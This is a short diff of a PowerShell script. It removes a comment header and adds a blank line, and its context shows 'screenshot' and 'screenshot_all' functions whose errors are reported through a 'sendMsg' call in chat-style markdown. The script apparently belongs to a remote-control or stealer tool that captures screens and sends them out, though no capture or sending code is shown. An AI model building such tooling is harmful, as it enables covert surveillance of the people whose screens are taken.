@@ -1,4 +1,3 @@
-# =============================================================== Screenshot Module ========================
 function screenshot {
     param([string]$quality = "high")
     
@@ -124,4 +123,5 @@ function screenshot_all {
     } catch {
         sendMsg -Message ":x: **Multi-monitor screenshot error:** $($_.Exception.Message)"
     }
+
 }
